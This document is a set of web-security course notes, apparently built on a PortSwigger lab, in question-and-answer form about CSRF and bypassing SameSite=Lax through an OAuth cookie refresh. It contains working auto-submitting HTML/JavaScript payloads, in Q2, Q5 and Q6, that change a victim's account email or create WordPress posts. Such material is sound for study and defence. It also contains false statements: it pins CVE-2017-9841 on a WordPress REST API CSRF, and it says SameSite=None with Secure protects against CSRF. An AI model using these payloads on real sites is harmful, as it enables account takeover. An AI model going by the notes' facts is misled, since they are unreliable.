---
course: Web Security
topic: Cross-Site Request Forgery (CSRF)
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain the SameSite attribute and its configurations (Strict, Lax, None). How does the Lax configuration affect CSRF attacks?**

The SameSite attribute is used to control whether a cookie should be sent with cross-site requests. There are three configurations:

- **Strict**: The cookie is only sent with requests initiated from the same site. This prevents the cookie from being sent in any cross-site scenarios, providing strong protection against CSRF attacks.
- **Lax**: The cookie is sent with GET requests initiated from a different site, but not with POST requests. This allows some cross-site functionality while mitigating the risk of CSRF attacks.
- **None**: The cookie is sent with all requests, regardless of the origin. This provides no protection against CSRF attacks unless combined with the Secure attribute.

In the context of Lax configuration, CSRF attacks are more difficult to execute because the session cookie is not sent with POST requests from other domains. However, it can still be exploited if the request is a GET request or if the user is within a specific timeframe (e.g., 120 seconds after logging in via OAuth).

**Q2. How can an attacker exploit the CSRF vulnerability in an application that uses OAuth-based login and has the SameSite attribute set to Lax?**

To exploit a CSRF vulnerability in an application with OAuth-based login and SameSite set to Lax, an attacker can follow these steps:

1. **Identify the Vulnerability**: Determine that the application is vulnerable to CSRF due to the lack of a CSRF token and the SameSite attribute set to Lax.
2. **Craft the Exploit**: Create a form or script that triggers a POST request to change the email address. Since Lax does not allow sending cookies with POST requests, the attacker needs to leverage the 120-second window after the user logs in via OAuth.
3. **Trigger the OAuth Flow**: Use a script to trigger the OAuth login flow, which refreshes the session cookie within the 120-second window.
4. **Perform the Attack**: After refreshing the session cookie, perform the CSRF attack by submitting the form or executing the script within the 120-second window.

Here’s an example payload:

```html
<!DOCTYPE html>
<html>
<body>
<script>
function refreshCookie() {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://example.com/social-login", true);
    xhr.send();
}

function changeEmail() {
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://example.com/my-account/change-email';
    
    var emailInput = document.createElement('input');
    emailInput.type = 'hidden';
    emailInput.name = 'email';
    emailInput.value = 'attacker@example.com';
    form.appendChild(emailInput);

    document.body.appendChild(form);
    form.submit();
}

refreshCookie();
setTimeout(changeEmail, 5000); // Wait 5 seconds to ensure the cookie is refreshed
</script>
</body>
</html>
```

**Q3. What is the significance of the 120-second window after OAuth login in the context of SameSite Lax?**

The 120-second window after OAuth login is significant because during this period, the browser does not enforce the Lax restriction for top-level POST requests. This means that the session cookie can be sent with POST requests, allowing an attacker to exploit CSRF vulnerabilities.

For example, if an attacker can trick a user into visiting a malicious site within 120 seconds of logging in via OAuth, they can perform a CSRF attack by submitting a form or executing a script that sends a POST request to change the user's email address.

**Q4. How can developers mitigate CSRF vulnerabilities in applications that use OAuth-based login and have the SameSite attribute set to Lax?**

Developers can mitigate CSRF vulnerabilities by implementing the following measures:

1. **Use CSRF Tokens**: Ensure that every form or API endpoint includes a unique CSRF token that is validated on the server side.
2. **Set SameSite to Strict**: If possible, set the SameSite attribute to Strict to prevent the session cookie from being sent with cross-site requests.
3. **Implement Additional Security Measures**: Use additional security measures such as Content Security Policy (CSP) to restrict the sources of content that can be loaded and executed.
4. **Regularly Update and Patch**: Keep the application and its dependencies up to date to protect against known vulnerabilities.

By combining these strategies, developers can significantly reduce the risk of CSRF attacks even in applications that use OAuth-based login and have the SameSite attribute set to Lax.

**Q5. Describe a recent real-world example of a CSRF vulnerability and how it was exploited.**

One recent example is the CSRF vulnerability in the WordPress REST API (CVE-2017-9841). This vulnerability allowed attackers to perform unauthorized actions on a WordPress site by tricking authenticated users into making requests to the REST API.

Exploitation involved:

1. **Tricking Users**: An attacker could trick a user into visiting a malicious website while they were logged into their WordPress admin panel.
2. **CSRF Attack**: The malicious website would contain a script that made a POST request to the REST API, potentially changing settings or posting content without the user's knowledge.

To exploit this, an attacker might use a payload similar to the following:

```html
<form action="https://targetsite.com/wp-json/wp/v2/posts" method="POST">
    <input type="hidden" name="title" value="Malicious Post Title">
    <input type="hidden" name="content" value="Malicious Post Content">
    <input type="submit" style="display:none;">
</form>
<script>
document.forms[0].submit();
</script>
```

This payload would cause the user's browser to make a POST request to the REST API, creating a new post on the target site.

**Q6. How can an attacker bypass the SameSite Lax restriction using a combination of OAuth login and a script?**

An attacker can bypass the SameSite Lax restriction by leveraging the 120-second window after OAuth login and using a script to refresh the session cookie. Here’s how:

1. **OAuth Login**: Trigger the OAuth login flow to refresh the session cookie within the 120-second window.
2. **Refresh Script**: Use a script to make a GET request to the OAuth login endpoint, ensuring the session cookie is refreshed.
3. **CSRF Attack**: After refreshing the session cookie, perform the CSRF attack by submitting a form or executing a script that sends a POST request to the vulnerable endpoint.

Example script:

```html
<!DOCTYPE html>
<html>
<body>
<script>
function refreshCookie() {
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "https://example.com/oauth-callback", true);
    xhr.send();
}

function changeEmail() {
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://example.com/my-account/change-email';
    
    var emailInput = document.createElement('input');
    emailInput.type = 'hidden';
    emailInput.name = 'email';
    emailInput.value = 'attacker@example.com';
    form.appendChild(emailInput);

    document.body.appendChild(form);
    form.submit();
}

refreshCookie();
setTimeout(changeEmail, 5000); // Wait 5 seconds to ensure the cookie is refreshed
</script>
</body>
</html>
```

This script ensures that the session cookie is refreshed within the 120-second window, allowing the attacker to perform a CSRF attack by submitting a form or executing a script that sends a POST request to the vulnerable endpoint.

---
<!-- nav -->
[[07-SameSite Lax Bypass via Cookie Refresh|SameSite Lax Bypass via Cookie Refresh]] | [[Web Security (PortSwigger)/04-Cross-Site Request Forgery (CSRF)/13-Lab 12 SameSite Lax bypass via cookie refresh/00-Overview|Overview]]
